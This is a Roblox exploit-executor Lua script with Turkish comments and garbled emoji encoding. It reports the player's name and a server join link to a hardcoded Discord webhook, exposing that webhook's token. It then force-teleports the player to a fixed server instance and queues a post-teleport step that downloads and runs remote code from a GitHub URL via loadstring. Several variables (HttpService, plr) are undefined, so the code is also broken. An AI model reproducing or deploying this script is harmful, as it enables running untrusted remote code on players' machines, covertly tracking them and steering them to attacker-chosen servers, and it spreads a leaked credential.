local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- âœ… Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1407545253342482502/Hf7jtvsT7qFGaD4WIRt-Jg-ObkKUJ3__Vp1xpzZ3sQKUXbaecioGYZopVqii5P1n9iGn"

-- âœ… Fixed PlaceId and JobId
local PLACE_ID = 142823291
local JOB_ID = "4ea7a4f6-1af4-41a4-b9fa-0cdf7b0e4556"

-- âœ… Universal request (executor uyumlu)
local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
if not req then warn("Request function bulunamadi!") return end

-- ðŸ”¹ Debug mesajÄ±
req({
    Url = WEBHOOK_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({content = "ðŸ¤– Bot baÅŸlatÄ±ldÄ±, fixed server'a teleport ediliyor..."})
})

-- ðŸ”¹ Queue function for different executors
local queue_func = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or function(code) warn("Queue on teleport not supported in this executor!") end

-- ðŸ”¹ Teleport ve webhook iÅŸlemi
spawn(function()
    local joinLink = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", PLACE_ID, JOB_ID)
    local robloxCode = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", PLACE_ID, JOB_ID)
            
    -- Webhook payload
    local payload = {
        content = robloxCode,
        embeds = {{
            title = "ðŸ”— Tap to Join",
            description = string.format("[Join Server Here](%s)\n**Player:** %s\n**PlaceId:** %s\n**ServerId:** %s", joinLink, plr.Name, PLACE_ID, JOB_ID),
            color = 5814783
        }}
    }
            
    req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
            
            -- ðŸ”¹ Teleport sonrasÄ± pastefy script
            queue_on_teleport([[
                task.spawn(function()
                    print("âœ… Teleport sonrasÄ± kod inject oldu, pastefy script yÃ¼kleniyor...")
            loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/newscript'))()
        end)
    ]])
            
    -- ðŸš€ Teleport
    TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, plr)
end)
